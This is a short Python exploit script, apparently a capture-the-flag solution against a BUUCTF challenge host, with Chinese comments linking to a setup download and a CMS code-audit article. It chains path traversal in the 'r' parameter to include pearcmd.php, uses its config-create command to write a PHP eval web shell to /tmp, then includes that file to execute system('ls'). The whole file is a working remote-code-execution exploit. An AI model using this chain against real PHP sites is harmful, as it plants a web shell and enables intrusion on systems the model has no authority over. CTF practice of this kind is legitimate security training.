# 环境搭建  https://down.chinaz.com/soft/36930.htm
# cms代码审计 https://mp.weixin.qq.com/s/WHRKGfYmaBSNqQpRjijHGA

import requests
import urllib.request


def send_get_request(url):
    try:
        response = urllib.request.urlopen(url)
        response.read()
    except urllib.error.URLError as e:
        print(f"请求发生错误: {e.reason}")


host = 'http://7354ed72-35de-4fff-bb46-114f029437d9.node4.buuoj.cn:81'
url = host + '/?+config-create+/&r=../../../../../../../../../usr/share/pear/pearcmd&<?=eval($_REQUEST[1]);?>+/tmp/aaa1236.php'
send_get_request(url)

res = requests.get(host + "/?r=../../../../../../../../../tmp/aaa1236&1=system('ls');")
print(res.text)
